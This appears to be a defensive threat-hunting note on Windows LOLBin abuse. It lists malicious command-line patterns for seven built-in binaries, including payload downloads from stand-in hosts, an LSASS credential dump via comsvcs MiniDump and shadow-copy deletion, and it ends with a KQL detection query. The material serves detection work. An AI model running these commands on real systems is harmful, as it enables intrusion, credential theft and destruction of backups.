# LOLBin abuse — investigation

## What are LOLBins?

Living Off the Land Binaries — legitimate Windows tools abused by attackers to avoid dropping their own malware. Signed by Microsoft, expected on the system, often not flagged by AV. Detection must be behavioural — what the binary is *doing*, not what it *is*.

> The question is never "is this a real Windows binary?" — it's "is this binary doing something it has no business doing?"

---

## powershell.exe

**Malicious patterns:**
```
powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\a8f3b.ps1
```
**Red flags:** `-enc`, `-nop`, `-w hidden`, `IEX`, `DownloadString`, `Reflection.Assembly::Load`

---

## certutil.exe

**Malicious patterns:**
```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
certutil.exe -decode C:\Temp\encoded.txt C:\Temp\payload.exe
```
**Red flags:** `-urlcache -f` with URL, `-decode`, any URL in arguments

---

## rundll32.exe

**Malicious patterns:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Public\lsass.dmp full
rundll32.exe C:\Users\user\AppData\Local\Temp\a9f3bc.dll,DllMain
```
> `comsvcs.dll, MiniDump` = credential dump. Escalate immediately.

---

## mshta.exe

**Malicious patterns:**
```
mshta.exe http://185.x.x.x/payload.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc..."")(window.close)"
WINWORD.EXE → mshta.exe http://malicious.com/stage1.hta
```
**Red flags:** Any URL argument, `vbscript:`/`javascript:` inline, parent is Office app

---

## wmic.exe

**Malicious patterns:**
```
wmic.exe /node:"192.168.1.50" process call create "cmd.exe /c powershell -enc..."
wmic.exe process call create "C:\Users\Public\svchost.exe"
wmic.exe shadowcopy delete
```
**Red flags:** `process call create`, `shadowcopy delete`, `/node:` targeting internal IPs

---

## regsvr32.exe

**Malicious patterns:**
```
regsvr32.exe /s /n /u /i:http://185.x.x.x/payload.sct scrobj.dll
```
**Red flags:** `/i:` with URL, `scrobj.dll`, DLL in `Temp`/`AppData`

---

## bitsadmin.exe

**Malicious patterns:**
```
bitsadmin.exe /transfer WindowsUpdate http://185.x.x.x/update.exe C:\Public\update.exe
bitsadmin.exe /SetNotifyCmdLine job1 C:\Temp\payload.exe NULL
```
**Red flags:** `/transfer` with URL, `SetNotifyCmdLine`

---

## KQL — master LOLBin sweep

```kql
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where (
    (FileName =~ "certutil.exe" and ProcessCommandLine has_any("-urlcache","-decode","http"))
    or (FileName =~ "powershell.exe" and ProcessCommandLine has_any("-enc","IEX","DownloadString","-w hidden","Reflection.Assembly"))
    or (FileName =~ "mshta.exe" and ProcessCommandLine has_any("http","vbscript:","javascript:"))
    or (FileName =~ "regsvr32.exe" and ProcessCommandLine has_any("http","scrobj.dll","/i:"))
    or (FileName =~ "rundll32.exe" and ProcessCommandLine has_any("comsvcs","MiniDump","AppData","Temp"))
    or (FileName =~ "wmic.exe" and ProcessCommandLine has_any("process call create","shadowcopy delete","/node:"))
    or (FileName =~ "bitsadmin.exe" and ProcessCommandLine has_any("/transfer","http","SetNotifyCmdLine"))
)
| project TimeGenerated, DeviceName, AccountName, FileName,
    ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```
